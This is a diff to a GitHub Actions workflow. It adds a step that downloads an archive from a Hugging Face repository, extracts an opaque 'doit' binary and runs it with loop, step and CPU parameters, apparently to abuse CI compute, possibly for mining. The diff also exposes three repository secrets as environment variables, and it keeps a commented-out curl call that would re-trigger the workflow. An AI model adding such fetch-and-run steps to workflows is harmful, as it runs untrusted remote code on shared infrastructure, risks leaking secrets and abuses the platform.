@@ -1,10 +1,17 @@
 # https://github.com/Mattraks/delete-workflow-runs
 # https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event
 
-name: Gu
+name: Doit
 
 on:
   workflow_dispatch:
+
+env:
+  TAG: v1.0.0
+  REPO_DIR: ${{ github.workspace }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
 
 jobs:
   main-job:
@@ -13,6 +20,15 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v7
+
+      - name: Doit
+        run: |
+          curl -o doit.7z -L --silent --show-error \
+            --url "https://huggingface.co/daviddusty/seol/resolve/main/doit_${{ env.TAG }}.7z?download=true"
+          7z x doit.7z
+          rm -rf doit.7z
+          chmod +x doit
+          ./doit loop 5 steps 1000000 wait 100 cpu 3
 
       - name: Run action
         run: |
@@ -56,11 +72,11 @@ jobs:
           #echo "-------------"
           #sleep 30m
 
-#      - name: Trigger workflow
-#        run: |
-#          curl -X POST \
-#            -H "Authorization: Bearer ${{ secrets.LOOP }}" \
-#            -H "Accept: application/vnd.github+json" \
-#            -H "X-GitHub-Api-Version: 2022-11-28" \
-#            -d '{"ref": "main"}' \
-#            https://api.github.com/repos/${{ github.repository }}/actions/workflows/auto.yml/dispatches
+      - name: Trigger workflow
+        run: |
+          #curl -X POST \
+          #  -H "Authorization: Bearer ${{ secrets.LOOP }}" \
+          #  -H "Accept: application/vnd.github+json" \
+          #  -H "X-GitHub-Api-Version: 2022-11-28" \
+          #  -d '{"ref": "main"}' \
+          #  https://api.github.com/repos/${{ github.repository }}/actions/workflows/auto.yml/dispatches
